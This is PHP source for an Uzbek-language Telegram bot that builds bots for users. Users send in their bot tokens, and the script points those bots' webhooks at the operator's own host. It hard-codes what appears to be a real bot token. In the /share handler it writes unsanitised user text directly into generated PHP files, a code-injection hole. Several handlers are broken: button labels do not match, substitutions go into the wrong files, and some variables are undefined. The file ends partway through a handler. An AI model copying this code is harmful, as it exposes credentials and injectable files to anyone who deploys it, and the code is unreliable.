<?php
$admin = "8125289524";
$token = "8398800703:AAHhCmdBlLdHvop4KvlehTbmbQLlzmC4jZk";
echo "https://api.telegram.org/bot".$token."/setwebhook?url=".$_SERVER['SERVER_NAME']."".$_SERVER['SCRIPT_NAME'];
function bot($method,$datas=[]){
global $token;
    $url = "https://api.telegram.org/bot".$token."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}


$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$mid = $message->message_id;
$msgs = json_decode(file_get_contents('msgs.json'),true);
$data = $update->callback_query->data;
$type = $message->chat->type;
$text = $message->text;
$cid = $message->chat->id;
$uid= $message->from->id;
$gname = $message->chat->title;
$left = $message->left_chat_member;
$new = $message->new_chat_member;
$name = $message->from->first_name;
$repid = $message->reply_to_message->from->id;
$repname = $message->reply_to_message->from->first_name;
$newid = $message->new_chat_member->id;
$leftid = $message->left_chat_member->id;
$newname = $message->new_chat_member->first_name;
$leftname = $message->left_chat_member->first_name;
$username = $message->from->username;
$cmid = $update->callback_query->message->message_id;
$cusername = $message->chat->username;
$repmid = $message->reply_to_message->message_id; 
$ccid = $update->callback_query->message->chat->id;
$cuid = $update->callback_query->message->from->id;

$photo = $message->photo;
$gif = $message->animation;
$video = $message->video;
$music = $message->audio;
$voice = $message->voice;
$sticker = $message->sticker;
$document = $message->document;
$for = $message->forward_from;
$forc = $message->forward_from_chat;

$lichka = file_get_contents("lichka.db");
  $lich = file_get_contents("lichka.db");

$startk = json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
  [['text'=>"💥Bot Yaratish💥"],['text'=>"🔻Botni O'chirish🔻"]],
  [['text'=>"♻️Statistika♻️"],['text'=>"❕Ma'lumot❕"]], 
  [['text'=>"🛒Buyurtma🛒"]], 
  ]
  ]);
  
$startkk = json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
  [['text'=>"🛒Buyurtma🛒", 'callback_data'=>"start"]],
  ]
  ]);
  
$botok = json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
  [['text'=>"⚠️O'chirish⚠️"]], 
  [['text'=>"🏡Bosh Menyu🏠"]], 
  ]
  ]); 
  
$buyurtmak = json_encode([
  'resize_keyboard'=>true,
  'inline_keyboard'=>[
  [['text'=>"📡Kanalimiz📡", 'url'=>"https://telegram.me/"],['text'=>"👥Guruhimiz👥", 'url'=>"https://telegram.me/"]], 
  [['text'=>"👨‍💻Admin👨‍💻", 'url'=>"https://telegram.me/SULTANOVCHANNELADMIN"]], 
  ]
  ]); 

$menyu = json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
  #[['text'=>"👍Yoqdibot"],['text'=>"Share Bot🔄"]],
  #[['text'=>"⬇️YouDown bot"],['text'=>"Niklar bot♌️"]],
  [['text'=>"🛡Guard bot"],['text'=>"Maker bot🧩"]], 
  [['text'=>"🎆Logo So'zlar🅰️"],['text'=>"💬Tarjimon🔄"]], 
  [['text'=>"📋Savol-Javob🖋"],['text'=>"👑KING Money💰"]], 
  [['text'=>"🕌Quron🕌"],['text'=>"💎Money🤑"]], 
  [['text'=>"ℹ️Profil Infoℹ️"],['text'=>"👾TG VEKTOR🔐"]], 
  [['text'=>"🎼Musiqa Editor🎹"],['text'=>"💋Nozimaxonim💝"]], 
  [['text'=>"🗨Matni Yashirish🗨"],['text'=>"Ⓜ️MEGA BOT🌐"]], 
  [['text'=>"➕Kalkulyator➖"],['text'=>"🎃DaySandBox🎃"]], 
  [['text'=>"✏️X-O"],['text'=>"Taxrir bot️🔍"]],
  [['text'=>"📣Livegram"],['text'=>"eLikeBot❤️"]],
  [['text'=>"💬Text to Golos🔊"]],
  [['text'=>"🏡Bosh Menyu🏠"]], 
  ]
  ]); 
  
$malumotk = json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
  [['text'=>"🔸Yana🔸"]], 
  [['text'=>"🏡Bosh Menyu🏠"]], 
  ]
  ]); 
  
$channeli = json_encode([
  'resize_keyboard'=>true,
  'inline_keyboard'=>[
  [['text'=>"📡Kanalimiz📡", 'url'=>"https://telegram.me/"],['text'=>"👥Guruhimiz👥", 'url'=>"https://telegram.me/"]],
  [['text'=>"👑KING👑", 'url'=>"https://telegram.me/"]],
  ]
  ]);
  
$yanak = json_encode([
  'resize_keyboard'=>true,
  'inline_keyboard'=>[
  [['text'=>"👨‍💻Admin👨‍💻", 'url'=>"https://telegram.me/"]],
  [['text'=>"👥Guruhimiz👥", 'url'=>"https://telegram.me/"],['text'=>"📡Kanalimiz📡", 'url'=>"https://telegram.me/"]],
  ]
  ]);

$back = json_encode([
    'resize_keyboard'=>true,
    'keyboard'=>[
    [['text'=>"⤴️Orqaga⤴️"]],]]); 
  

mkdir("baza");
mkdir("baza/$uid");

//Kanalga a'zolikni tekshirish
$from_id = $message->from->id;
$chat_id = $message->chat->id;
$ssa = json_decode(file_get_contents('data.json'),1);
 $status = bot('getChatMember',['chat_id'=>'@SULTANOVTELEGRAMBOTS','user_id'=>$from_id])->result->status;
        if($status == 'left'){
					 bot('answerCallbackQuery',[
       'callback_query_id'=>$cqid,
       'text'=> "❗️XATOLIK❗️",
      'show_alert'=>true
        ]);
            bot('sendMessage',[
                'chat_id'=>$chat_id,
                'text'=>"
❗️Kechirasi siz bizning kanalga a'zo emassiz❕
☝️Avval kanalimizga a'zo bo'ling ➕

📡Kanalimiz: @SULTANOVTELEGRAMBOTS
🤓Admin: ( @SULTANOVCHANNELADMIN )",
                'reply_to_message_id'=>$message->message_id,
                'reply_markup'=> $channeli, 
			]);
      exit();
        }

//START
if($text=="/start"){
				 bot('answerCallbackQuery',[
       'callback_query_id'=>$cqid,
       'text'=> "❤️Salom Botimizga Xush Kelibsiz❤️",
	   'show_alert'=> true,
        ]);
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"😁Assalomu alaykum❕
🤖Botga xush kelibsiz🤗 ☝️Ushbu bot orqali shaxsiy botlaringizni yaratishingiz mumkin😱
👌 Bu judayam oson shunchaki kerakli bo'limni tanlang👇

👨‍💻Admin: KING (@SULTANOVCHANNELADMIN) 👈
",
   'reply_markup'=>$startk, 
   'parse_mode' => 'html',
   
  ]);
}
//Bosh Menyu & START
if($text=="🏡Bosh Menyu🏠"){
				 bot('answerCallbackQuery',[
       'callback_query_id'=>$cqid,
       'text'=> "🏡Bosh menyudasiz❤️",
	   	   'show_alert'=> true,
        ]);
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"
   😁Assalomu alaykum❕
🤖Botga xush kelibsiz🤗 ☝️Ushbu bot orqali shaxsiy botlaringizni yaratishingiz mumkin😱
👌 Bu judayam oson shunchaki kerakli bo'limni tanlang👇

👨‍💻Admin: KING (@SULTANOVCHANNELADMIN) 👈",
   'reply_markup'=>$startk, 
   'parse_mode' => 'html',
   
  ]);
}
//Orqaga & START
if($text=="⤴️Orqaga⤴️"){
				 bot('answerCallbackQuery',[
       'callback_query_id'=>$cqid,
       'text'=> "🏡Bosh menyudasiz❤️",
	   	   'show_alert'=> true,
        ]);
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"
   😁Assalomu alaykum❕
🤖Botga xush kelibsiz🤗 ☝️Ushbu bot orqali shaxsiy botlaringizni yaratishingiz mumkin😱
👌 Bu judayam oson shunchaki kerakli bo'limni tanlang👇

👨‍💻Admin: KING (@SULTANOVCHANNELADMIN) 👈
   ",
   'reply_markup'=>$startk, 
   'parse_mode' => 'html',
   
  ]);
}
//Data & START
if($data=="start"){
			 bot('answerCallbackQuery',[
       'callback_query_id'=>$cqid,
       'text'=> "🏡Bosh menyudasiz❤️",
	   	   'show_alert'=> true,
        ]);
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"😁Assalomu alaykum❕
🤖Botga xush kelibsiz🤗 ☝️Ushbu bot orqali shaxsiy botlaringizni yaratishingiz mumkin😱
👌 Bu judayam oson shunchaki kerakli bo'limni tanlang👇

👨‍💻Admin: KING (@@SULTANOVCHANNELADMIN) 👈
",
   'reply_markup'=>$startk, 
   'parse_mode' => 'html',
   
  ]);
}

//Bot yaratish
if($text=="💥Bot Yaratish💥"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"❕Bot yaratish❕

💠Menyudan istalgan botni tanlang:
",
   'reply_markup'=>$menyu, 
   'parse_mode' => 'html',
   
  ]);
}
//Botni o'chirish
if($text=="🔻Botni O'chirish🔻"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"
   ❗️Botni O'chirish❗️

💠Ushbu bo'lim orqali osongina ishlab turgan botni o'chirib qo'yishingiz mumkin❕
",
   'reply_markup'=>$botok, 
   'parse_mode' => 'html',
   
  ]);
}
//Del Bot
if($text=="⚠️O'chirish⚠️"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"
 ❗️Botni o'chirish uchun shunchaki quyidagi amalni to'g'ri bajaring👇

/del BOT TOKEN

🧩Namuna:
/del 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0
",
   'reply_markup'=>$botok, 
   'parse_mode' => 'html',
   
  ]);
}
//Delete
if(mb_stripos($text, "/del")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
 	file_get_contents("https://api.telegram.org/bot$px/deletewebhook");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"❗️Bot muvaffaqiyatli o'chirildi❗️

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
//Statistika
if($text=="♻️Statistika♻️"){
  $soat = date('H:i', strtotime('5 hour'));
  $sana = date('d.m.Y',strtotime('5 hour'));
  $lich = substr_count($lichka,"\n");
  bot('sendmessage',[
    'chat_id'=>$cid,
    'text'=>"
♦STATISTIKA♦	
	
<b>Bot foydalanuvchilari soni: $lich ta</b>

<i>
📆 Bugun sana: $sana
⏰ Hozir soat: $soat
</i>",
    'reply_markup'=>$stark, 
    'parse_mode'=>"html"
 ]);
}
//Buyurtma
if($text=="🛒Buyurtma🛒"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"
🛒Buyurtma🛒

😃Sizga ham bizning <b>🧩STARK</b> botga o'xshagan bot kerak bo'lsa, tezda <b>🤓ADMIN</b>ga murojaat qilishingiz mumkin❕
🔹Tez va arzon narxlarda yasab beriladi👌

🔮Bot bo'yicha boshqa yangilik va muhokamalar bizning kanal va guruhda👇
",
   'reply_markup'=>$buyurtmak, 
   'parse_mode' => 'html',
   
  ]);
}
//Ma'luomt
if($text=="❕Ma'lumot❕"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"
   ❕Ma'lumot❕

🤖Ushbu bot orqali, hech qanday sever va ortiqcha saytlarsiz shaxsiy botlaringizni yaratishingiz mumkin❕ Bu judayam oson, buning uchun <b>💥Bot Yaratish💥</b> bo'limidan foydalanishingiz mumkin❕
<b> 💥Bot Yaratish💥 </b> bo'limidan kerakli botni tanlab bo'lgach botingizni tokenini yuborasiz va tayyor❕
❗️DIQQAT❗️ Agarda botingiz ishlamasa tokenni tekshirib qayta jo'nating❕
☝️Agarda ishga tushirilgan bot sizga kerak bo'lmasa uni osongina o'chirib qo'yishingiz mumkin🔌
✨Buning uchun <b>🔻Botni O'chirish🔻</b> bo'limidan foydalanishingiz mumkin❕
<b>🔻Botni O'chirish🔻</b> bo'limidan batafsil bilib olishingiz mumkin❕

💠Agarda Bot Token nima va qanday olinishini bilishni hohlasangiz quyidagi <b>🔸Yana🔸</b> tugmasini bosing❕

😃Sizga ham shu botga o'xshagan bot kerak bo'lsa bosh menyudan <b>🛒Buyurtma🛒</b> bo'limiga o'tishingiz mumkin❕
",
   'reply_markup'=>$malumotk, 
   'parse_mode' => 'html',
   
  ]);
}
//Ma'luomt > Yana
if($text=="🔸Yana🔸"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"
❕Qo'shimcha Ma'lumot❕

🌐Telegram tarmog'ida har bir bot uchun maxsus API TOKEN (TOKEN) beriladi.〰️ Bu TOKEN har bir botga bitta beriladi va qayta takrorlanmaydi☝️ Tokenni @BotFather dan olish mumkin👨‍🦳. Bu telegramning maxsus botni aktivlashtirib beruvchi boti hisoblanadi👮‍♂️
👨‍🔧BotFather dan bot ochish:

1 - @Botfather ga kirib START buyrug'ini beramiz❕
2 - /newbot buyrug'ini jo'natamiz❕
3 - Botingiz uchun shunchaki ISM yuborasiz❕
4 - Botingizning USERNAME (Qidiruvdagi ISMI)ni yuborasiz (USERNAME band bo'lishi ham mumkin)❕
5 - Keyin BotFather sizga maxsus API TOKEN joylashgan habar yuboradi❕
5 - API TOKEN ni nusxalab olamiz, buning uchun shunchaki uning ustiga bir marta bosamiz va o'chib ketmaydigan joyga saqlab qo'yamiz❕
6 - Tayyor endi /mybots buyrug'ini jo'natamiz (Endi botni faqatgina siz boshqara olasiz, /mybots bo'limida esa siz aktivlashtirgan botlar mavjud, u yerdan ularni tahrirlashingiz mumkin)❕
7 - Botni istalganimizcha tahrirlab olamiz va tayyor❕

☝️Agarda tushunmagan bo'lsangiz bemalol <b>ADMIN</b>ga murojaat qilishingiz mumkin❕
",
   'reply_markup'=>$yanak, 
   'parse_mode' => 'html',
   
  ]);
}

#---------------------------KING---------------------------#


if($text=="⬆️Share Bot🔄"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /share 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0
   Inlineni yoqing!",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
if(mb_stripos($text,"/share")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/Share.php");
    file_put_contents("baza/$uid/Share.php", file_get_contents("Share.php"));
    $savet =  str_replace("api_api", "$text", file_get_contents("baza/$uid/Share.php"));
    file_put_contents("baza/$uid/Share.php", "$savet");
    $savea =  str_replace("api_admin", "$uid", file_get_contents("baza/$uid/Share.php"));
    file_put_contents("baza/$uid/Share.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/Share.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈
",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);
}
if($text=="🛡Guard bot🛡"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /guard 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0
   Inlineni yoqing!",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}

if(mb_stripos($text, "/guard")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/Guard.php");
    file_put_contents("baza/$uid/Guard.php", file_get_contents("Guard.php"));
    $savet =  str_replace("api_api", "$px", file_get_contents("baza/$uid/Guard.php"));
    file_put_contents("baza/$uid/Guard.php", "$savet");
    $savea =  str_replace("api_admin", "$uid", file_get_contents("baza/$uid/Guard.php"));
    file_put_contents("baza/$uid/Guard.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/Guard.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}


if($text=="🎯Maker bot🧩"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /maker 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/maker")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/makerr.php");
    file_put_contents("baza/$uid/makerr.php", file_get_contents("makerr.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/makerr.php"));
    file_put_contents("baza/$uid/makerr.php", "$savet");
	    $savea =  str_replace("API_ADMIN", "$uid", file_get_contents("baza/$uid/elikbot.php"));
    file_put_contents("baza/$uid/elikbot.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/makerr.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈
.
",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
if(mb_stripos($text, "/makerr")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/Maker.php");
    file_put_contents("baza/$uid/Maker.php", file_get_contents("Maker.php"));
    $savet =  str_replace("api_api", "$px", file_get_contents("baza/$uid/Maker.php"));
    file_put_contents("baza/$uid/Maker.php", "$savet");
    $savea =  str_replace("api_admin", "$uid", file_get_contents("baza/$uid/Maker.php"));
    file_put_contents("baza/$uid/Maker.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/Maker.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈
",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);
}


if($text=="✏️X-O🖍"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /xo 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0
   Inlineni yoqing!",'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}

if(mb_stripos($text, "/xo")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/X-0.php");
    file_put_contents("baza/$uid/X-0.php", file_get_contents("X-0.php"));
    $savet =  str_replace("api_api", "$px", file_get_contents("baza/$uid/X-0.php"));
    file_put_contents("baza/$uid/X-0.php", "$savet");
    $savea =  str_replace("api_admin", "$uid", file_get_contents("baza/$uid/X-0.php"));
    file_put_contents("baza/$uid/X-0.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/X-0.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈
",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);
}

if($text=="🖊Taxrir bot️🔍"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /taxrir 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}

if(mb_stripos($text, "/taxrir")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/Taxrir.php");
    file_put_contents("baza/$uid/Taxrir.php", file_get_contents("Taxrir.php"));
    $savet =  str_replace("api_api", "$px", file_get_contents("baza/$uid/Taxrir.php"));
    file_put_contents("baza/$uid/Taxrir.php", "$savet");
    $savea =  str_replace("api_admin", "$uid", file_get_contents("baza/$uid/Taxrir.php"));
    file_put_contents("baza/$uid/Taxrir.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/Taxrir.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈
",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);
}


if($text=="⬇️YouDown bot⬇️"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /down 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}

if(mb_stripos($text, "/down")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/YouDown.php");
    file_put_contents("baza/$uid/YouDown.php", file_get_contents("YouDown.php"));
    $savet =  str_replace("api_api", "$px", file_get_contents("baza/$uid/YouDown.php"));
    file_put_contents("baza/$uid/YouDown.php", "$savet");
    $savea =  str_replace("api_admin", "$uid", file_get_contents("baza/$uid/YouDown.php"));
    file_put_contents("baza/$uid/YouDown.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/YouDown.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈
",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);
}

if($text=="♑️Niklar bot♌️"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /nik 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}

if(mb_stripos($text, "/nik")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/Niklar.php");
    file_put_contents("baza/$uid/Niklar.php", file_get_contents("Niklar.php"));
    $savet =  str_replace("api_api", "$px", file_get_contents("baza/$uid/Niklar.php"));
    file_put_contents("baza/$uid/Niklar.php", "$savet");
    $savea =  str_replace("api_admin", "$uid", file_get_contents("baza/$uid/Niklar.php"));
    file_put_contents("baza/$uid/Niklar.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/Niklar.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈
",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);
}

if($text=="📣Livegram📢"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /liv 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}

if(mb_stripos($text, "/liv")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/livegram.php");
    file_put_contents("baza/$uid/livegram.php", file_get_contents("livegram.php"));
    $savet =  str_replace("api_api", "$px", file_get_contents("baza/$uid/livegram.php"));
    file_put_contents("baza/$uid/livegram.php", "$savet");
    $savea =  str_replace("api_admin", "$uid", file_get_contents("baza/$uid/livegram.php"));
    file_put_contents("baza/$uid/livegram.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/livegram.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈
",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);
}

if($text=="👍eLikeBot❤️"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /like 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0
   Inlineni yoqing!",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}

if(mb_stripos($text, "/like")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/elikbot.php");
    file_put_contents("baza/$uid/elikbot.php", file_get_contents("elikbot.php"));
    $savet =  str_replace("api_api", "$px", file_get_contents("baza/$uid/elikbot.php"));
    file_put_contents("baza/$uid/elikbot.php", "$savet");
    $savea =  str_replace("api_admin", "$uid", file_get_contents("baza/$uid/elikbot.php"));
    file_put_contents("baza/$uid/elikbot.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/elikbot.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈
",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);
}

if($text=="👍Yoqdibot✔️"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /yoqdi 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}

if(stripos($text, "/yoqdi")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/yoqdibot.php");
    file_put_contents("baza/$uid/yoqdibot.php", file_get_contents("yoqdibot.php"));
    $savet =  str_replace("api_api", "$px", file_get_contents("baza/$uid/yoqdibot.php"));
    file_put_contents("baza/$uid/yoqdibot.php", "$savet");
    $savea =  str_replace("api_admin", "$uid", file_get_contents("baza/$uid/yoqdibot.php"));
    file_put_contents("baza/$uid/yoqdibot.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/yoqdibot.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈
",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);
}
			if($text=="⬜️QR Kod⬛️"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /qr 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/qr")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/qr.php");
    file_put_contents("baza/$uid/qr.php", file_get_contents("qr.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/qr.php"));
    file_put_contents("baza/$uid/qr.php", "$savet");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/qr.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}

if($text=="🚪Anonim Chat👁"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /anmchat 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/anmchat")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
    $clone=file_get_contents("baza/$uid/anonimchat.php");
    file_put_contents("baza/$uid/anonimchat.php.php", file_get_contents("anonimchat.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/anonimchat.php.php"));
    file_put_contents("baza/$uid/anonimchat.php.php", "$savet");
	    $savea =  str_replace("api_admin", "$uid", file_get_contents("baza/$uid/elikbot.php"));
    file_put_contents("baza/$uid/elikbot.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/anonimchat.php.php");
    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
